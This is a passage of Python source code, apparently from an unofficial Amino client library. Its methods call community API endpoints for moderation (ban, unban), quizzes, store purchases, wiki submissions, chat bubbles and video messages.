
        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/ban", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def unban(self, userId: str, reason: str):
        """
        Unban user.

        Accepting:
        - userId: str
        - reason: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "note": {
                "content": reason
            },
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/unban", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def reorder_featured_users(self, userIds: list):
        """
        Reorder featured users.

        Accepting:
        - userId: list[str]

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "uidList": userIds,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/user-profile/featured/reorder", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()

    def get_hidden_blogs(self, start: int = 0, size: int = 25):
        """
        Get hidden blogs.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/feed/blog-disabled?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def get_featured_users(self, start: int = 0, size: int = 25):
        """
        Get featured users.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `UserProfileCountList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile?type=featured&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileCountList(response.json()).UserProfileCountList

    def review_quiz_questions(self, quizId: str):
        """
        Review quiz questions.

        Accepting:
        - quizId: str

        Recieving:
        - object `QuizQuestionList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog/{quizId}?action=review", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.QuizQuestionList(response.json()["blog"]["quizQuestionList"]).QuizQuestionList

    def get_recent_quiz(self, start: int = 0, size: int = 25):
        """
        Get recent quizes.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog?type=quizzes-recent&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def get_trending_quiz(self, start: int = 0, size: int = 25):
        """
        Get tranding quizes.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/feed/quiz-trending?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def get_best_quiz(self, start: int = 0, size: int = 25):
        """
        Get the best quizes ever.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/feed/quiz-best-quizzes?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def send_action(self, actions: list, blogId: str = None, quizId: str = None, lastAction: bool = False):
        """
        Sending action to be in live layer.

        Accepting:
        - actions: list
            - can be "Browsing"
        - blogId: str = None
        - quizId: str = None
            - not neccessary
            - blogId -> quizId
            - can be only one field
        - lastAction: bool = False
            - ??

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """

        if lastAction is True: t = 306
        else: t = 304

        data = {
            "o": {
                "actions": actions,
                "target": f"ndc://x{self.comId}/",
                "ndcId": int(self.comId),
                "params": {"topicIds": [45841, 17254, 26542, 42031, 22542, 16371, 6059, 41542, 15852]},
                "id": "831046"
            },
            "t": t
        }

        if blogId is not None or quizId is not None:
            data["target"] = f"ndc://x{self.comId}/blog/{blogId}"
            if blogId is not None: data["params"]["blogType"] = 0
            if quizId is not None: data["params"]["blogType"] = 6

        return self.send(dumps(data))

    # Provided by "spectrum#4691"
    def purchase(self, objectId: str, objectType: int, aminoPlus: bool = True, autoRenew: bool = False):
        """
        Purchasing... something... from store...

        You probably want to catch objectIds by yourself using HTTP Toolkit.

        Accepting:
        - objectId: str
            - id of object that you wanna buy
        - objectType: str
            - type of object that you wanna buy
        - aminoPlus: bool = True
            - ???
        - isAutoRenew: bool = False
            - do you wanna auto renew your purchase?

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = {'objectId': objectId,
                'objectType': objectType,
                'v': 1,
                "timestamp": inttime()}

        if aminoPlus: data['paymentContext'] = {'discountStatus': 1, 'discountValue': 1, 'isAutoRenew': autoRenew}
        else: data['paymentContext'] = {'discountStatus': 0, 'discountValue': 1, 'isAutoRenew': autoRenew}

        data = dumps(data)
        response = self.session.post(f"/x{self.comId}/s/store/purchase", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    # Provided by "spectrum#4691"
    def apply_avatar_frame(self, avatarId: str, applyToAll: bool = True):
        """
        Apply avatar frame.

        **Parameters**
            - **avatarId** : ID of the avatar frame.
            - **applyToAll** : Apply to all.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`

        """

        data = {"frameId": avatarId,
                "applyToAll": 0,
                "timestamp": inttime()}

        if applyToAll: data["applyToAll"] = 1

        data = dumps(data)
        response = self.session.post(f"/x{self.comId}/s/avatar-frame/apply", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def invite_to_vc(self, chatId: str, userId: str):
        """
        Invite a User to a Voice Chat

        **Parameters**
            - **chatId** - ID of the Chat
            - **userId** - ID of the User

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """

        data = dumps({
            "uid": userId
        })

        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/vvchat-presenter/invite/", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def add_poll_option(self, blogId: str, question: str):
        """
        Add poll option.

        Accepting:
        - blogId: str
        - question: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "mediaList": None,
            "title": question,
            "type": 0,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/blog/{blogId}/poll/option", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def create_wiki_category(self, title: str, parentCategoryId: str, content: str = None):
        """
        Create wiki category.

        Accepting:
        - title: str
        - parentCategoryId: str
        - content: str = None

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "content": content,
            "icon": None,
            "label": title,
            "mediaList": None,
            "parentCategoryId": parentCategoryId,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/item-category", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def create_shared_folder(self, title: str):
        """
        Create shared folder.

        Accepting:
        - title: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
                "title":title,
                "timestamp":inttime()
            })
        response = self.session.post(f"/x{self.comId}/s/shared-folder/folders", headers=self.additional_headers(data=data),data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def submit_to_wiki(self, wikiId: str, message: str):
        """
        Submit wiki to curator review. Maybe, it will get approve?

        https://www.youtube.com/watch?v=EmygSPd4Ho0

        Accepting:
        - wikiId: str
        - message: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "message": message,
            "itemId": wikiId,
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/knowledge-base-request", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def accept_wiki_request(self, requestId: str, destinationCategoryIdList: list):
        """
        Accept wiki.

        "Congratulations!

        Your WIKI has been approved."

        https://www.youtube.com/watch?v=LabIat9t-uY

        Accepting:
        - requestId: str
        - destinationCategoryIdList: list

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "destinationCategoryIdList": destinationCategoryIdList,
            "actionType": "create",
            "timestamp": inttime()
        })

        response = self.session.post(f"/x{self.comId}/s/knowledge-base-request/{requestId}/approve", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def reject_wiki_request(self, requestId: str):
        """
        Reject wiki.

        "Congratulations!

        Your WIKI has been denied.

        Don't even bother trying again."

        https://www.youtube.com/watch?v=3vH6GBbeAgA

        Accepting:
        - requestId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({})

        response = self.session.post(f"/x{self.comId}/s/knowledge-base-request/{requestId}/reject", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def get_wiki_submissions(self, start: int = 0, size: int = 25):
        """
        Get wiki submissions to be approved.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `WikiRequestList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/knowledge-base-request?type=all&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.WikiRequestList(response.json()["knowledgeBaseRequestList"]).WikiRequestList

    def get_live_layer(self):
        """
        Get live layer.

        Recieving:
        - object `LiveLayer`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/live-layer/homepage?v=2", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.LiveLayer(response.json()["liveLayerList"]).LiveLayer

    def apply_bubble(self, bubbleId: str, chatId: str, applyToAll: bool = False):
        """
        Apply bubble that you want.

        Accepting:
        - bubbleId: str
        - chatId: str
        - applyToAll: bool = False
            - apply bubble to all chats?

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = {
            "applyToAll": 0,
            "bubbleId": bubbleId,
            "threadId": chatId,
            "timestamp": inttime()
        }

        if applyToAll is True:
            data["applyToAll"] = 1

        data = dumps(data)
        response = self.session.post(f"/x{self.comId}/s/chat/thread/apply-bubble", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def send_video(self, chatId: str, videoFile: BinaryIO, imageFile: BinaryIO, message: str = None, mediaUhqEnabled: bool = False):
        """
        Sending video.

        Accepting:
        - chatId: str
        - message: str
        - videoFile: BinaryIO [open(file, "rb")]
        - imageFile: BinaryIO [open(file, "rb")]
        - mediaUhqEnabled: bool = False

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        i = str_uuid4().upper()
        cover = f"{i}_thumb.jpg"
        video = f"{i}.mp4"
        
        data = dumps({
            "clientRefId": clientrefid(),
            "content": message,
            "mediaType": 123,
            "videoUpload":
            {
                "contentType": "video/mp4",
                "cover": cover,
                "video": video
            },
            "type": 4,
            "timestamp": inttime(),
            "mediaUhqEnabled": mediaUhqEnabled,
            "extensions": {}    
        })

        files = {
            video: (video, videoFile.read(), 'video/mp4'),
            cover: (cover, imageFile.read(), 'application/octet-stream'),
            'payload': (None, data, 'application/octet-stream')
        }
        
        response = self.session.post(
            f"/x{self.comId}/s/chat/thread/{chatId}/message",
            headers=self.additional_headers(data=data, content_type="default"),
            files=files
        )
        
        if response.status_code != 200: return exceptions.CheckException(response)
        else: return response.status_code